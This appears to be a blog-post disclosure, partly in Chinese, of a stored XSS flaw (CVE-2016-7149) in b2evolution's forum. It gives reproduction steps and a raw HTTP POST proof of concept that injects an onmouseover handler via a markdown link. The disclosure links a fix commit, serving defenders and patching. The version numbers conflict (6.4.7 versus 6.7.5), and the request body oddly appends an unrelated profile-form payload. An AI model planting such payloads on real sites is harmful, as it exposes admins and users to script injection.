---
layout: post
title: B2evolution v6.4.7 forum XSS [CVE-2016-7149]
---

发现者: 陈瑞琦 

发现日期: 2016-08-11

下载地址: [b2evolution](http://b2evolution.net/downloads/)

作者: b2evolution.net

作者通知日期: 2016-08-11

作者联系手段: http://b2evolution.net/?disp=msgform

CVE-ID：CVE-2016-7149

**描述:**

b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)

**细节:** 

B2evolutioes stored XSS in b2evolution version 6.7.5

Any user can post a forum with some evil code in it.

And when the admin see the forum, the page is lack of filter to protect the admin.

Step 1 : Register a user of the web-site, active the user by mail.

Step 2 : Post a forum with some thing like 
<pre><code>
[test_forum_xss](http://test.forum.xss"onmouseover="alert(1)"on="1 "test_forum_xss")
</code></pre>
Step 3 : Save the changes

Step 4 : Any user view the forum, when the mouse over the content, the XSS code runs.

**PoC:**

`code`
<pre><code>
POST /b2evolution/htsrv/item_edit.php HTTP/1.1
Host: 192.168.204.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.130/b2evolution/index.php/forums/?disp=edit&cat=17
Cookie: session_b2evo_192_168_204_130=41_UqjtnJWp3oJZWVMtpznHzh4zgKxvBvTR; session_b2evo=87_j6i55FblKwr7rWFbheuTwjRaLbiN6ghM
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 636

post_title=test_forum_xss&content=%5Btest_forum_xss%5D%28http%3A%2F%2Ftest.forum.xss%22onmouseover%3D%22alert%281%29%22on%3D%221+%22test_forum_xss%22%29%0D%0A&renderers_displayed=1&renderers%5B%5D=b2evMark&renderers%5B%5D=b2evWiLi&renderers%5B%5D=b2evGMco&renderers%5B%5D=b2evALnk&renderers%5B%5D=evo_videoplug&renderers%5B%5D=b2WPAutP&post_category=17&post_extracats%5B%5D=17&actionArray%5Bcreate%5D=&crumb_item=IT6Hs70o5KE9J0kgz9nmWNnAhCfW4qeo&ctrl=items&blog=5&post_ID=0&redirect_to=http%3A%2F%2F192.168.204.130%2Fb2evolution%2Findex.php%2Fforums%2F%3Fdisp%3Dedit&preview=0&more=1&preview_userid=8&item_typ_ID=6&post_status=community
edited_user_login=kevino&edited_user_firstname=kevino&edited_user_lastname=kevino&edited_user_nickname=kevino&edited_user_gender=M&edited_user_ctry_ID=&edited_user_rgn_ID=&edited_user_subrg_ID=&edited_user_city_ID=&edited_user_age_min=&edited_user_age_max=&organizations%5B%5D=&uf_38=kevino&uf_39=kevino&uf_40=kevino&uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&uf_43=http%3A%2F%2Fkevino.net%2Fkevino&new_field_type=3&actionArray%5Bupdate%5D=Save+Changes%21&crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&user_tab=profile&identity_form=1&user_ID=8&blog=1&orig_user_ID=8&12_3=4_56

</code></pre>

**Fix:**

https://github.com/b2evolution/b2evolution/commit/9a4ab85439d1b838ee7b8eeebbf59174bb787811
